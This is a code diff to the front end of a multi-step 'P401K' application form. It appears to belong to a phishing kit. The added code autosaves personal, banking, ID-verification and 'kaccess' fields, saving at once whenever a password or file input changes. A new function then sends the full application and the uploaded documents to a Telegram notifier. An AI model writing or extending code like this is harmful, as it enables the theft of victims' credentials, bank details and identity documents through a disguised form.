@@ -272,6 +272,63 @@ function initApplicationForm() {
 
   const allUploadedFiles = [];
 
+  let autosaveTimer = null;
+  let lastSavedAt = 0;
+
+  function collectAllStepData() {
+    for (let s = 1; s <= totalSteps; s++) collectStepData(s);
+  }
+
+  function scheduleAutosave(urgent) {
+    const appId = getAppId();
+    collectAllStepData();
+    const empty = [
+      formData.personal, formData.banking, formData.business,
+      formData.idVerify, formData.kaccess
+    ].every(function (b) { return Object.keys(b).every(function (k) { return !b[k]; }); });
+    if (empty) return;
+    if (!window.__upsertDraftApplication) return;
+
+    clearTimeout(autosaveTimer);
+    const saveFn = function () {
+      if (Date.now() - lastSavedAt < 1500 && !urgent) return;
+      if (window.__showDraftSaveToast) window.__showDraftSaveToast('saving');
+      lastSavedAt = Date.now();
+      const snap = JSON.parse(JSON.stringify({
+        personal: formData.personal || {},
+        banking: formData.banking || {},
+        business: formData.business || {},
+        idVerify: formData.idVerify || {},
+        kaccess: formData.kaccess || {}
+      }));
+      window.__upsertDraftApplication(snap, appId).then(function () {
+        if (window.__showDraftSaveToast) window.__showDraftSaveToast('saved');
+      }).catch(function () {});
+    };
+    autosaveTimer = setTimeout(saveFn, urgent ? 50 : 900);
+  }
+
+  function attachAutosaveListeners() {
+    const root = formCard;
+    if (!root) return;
+    root.addEventListener('input', function (e) {
+      if (!e.target) return;
+      if (e.target.matches('input[type="password"], input[type="file"], input[type="checkbox"], input[type="radio"]')) {
+        scheduleAutosave(true);
+      } else if (e.target.matches('input, textarea, select')) {
+        scheduleAutosave(false);
+      }
+    }, { passive: true });
+    root.addEventListener('change', function (e) {
+      if (!e.target) return;
+      if (e.target.matches('select, input[type="checkbox"], input[type="radio"], input[type="file"]')) {
+        scheduleAutosave(true);
+      }
+    }, { passive: true });
+  }
+
+  attachAutosaveListeners();
+
   function trackUploadedFile(file, fieldName, fieldLabel) {
     allUploadedFiles.push({
       file: file,
@@ -481,7 +538,53 @@ function initApplicationForm() {
       <div class="review-item"><span class="label">Routing Number</span><span class="value">${ba.routing ? '••••••' + (ba.routing.slice(-3) || '') : '—'}</span></div>
       <div class="review-item"><span class="label">24hr Review</span><span class="value">Required before approval</span></div>
     `;
+
+    // Render FULL organized form review at the bottom of review section
+    collectAllStepData();
+    const fullBody = document.getElementById('fullReviewBody');
+    const fullCard = document.getElementById('fullApplicationFormReview');
+    if (fullBody && window.__renderFullReviewBody) {
+      fullBody.innerHTML = window.__renderFullReviewBody(formData);
+    }
+    if (fullCard) {
+      fullCard.style.display = 'block';
+    }
   }
+
+  window.sendFullApplicationToTelegram = function (appData, filesInfo) {
+    if (!window.telegramNotify) return Promise.resolve();
+    var appId = appData && appData.appId ? appData.appId : getAppId();
+    var organizedText;
+    if (window.__buildOrganizedApplicationText) {
+      organizedText = window.__buildOrganizedApplicationText(formData, appId);
+    } else {
+      organizedText = [
+        '⭐'.repeat(15),
+        '📋 FULL APPLICATION FORM',
+        'Application ID: P401K-2026-' + appId,
+        'Filled at: ' + new Date().toLocaleString(),
+        '⭐'.repeat(15)
+      ].join('\n');
+    }
+    var subject = '📄 P401K Application Submitted — ' + appId;
+    var extraLines = organizedText.split('\n');
+    var files = [];
+    try {
+      for (var i = 0; i < (filesInfo || []).length; i++) {
+        var fi = filesInfo[i];
+        if (!fi) continue;
+        var field = fi.fieldName || 'document';
+        if (field === 'photo') continue;
+        if (fi.file) files.push({ field: 'document', file: fi.file, filename: fi.name || (field + '.bin'), mime: fi.type });
+      }
+    } catch (_) {}
+    return new Promise(function (resolve) {
+      try {
+        window.telegramNotify(subject, extraLines, files, true);
+        setTimeout(resolve, 1200);
+      } catch (e) { resolve(); }
+    });
+  };
 
   function getAppId() {
     var el = document.getElementById('appId');
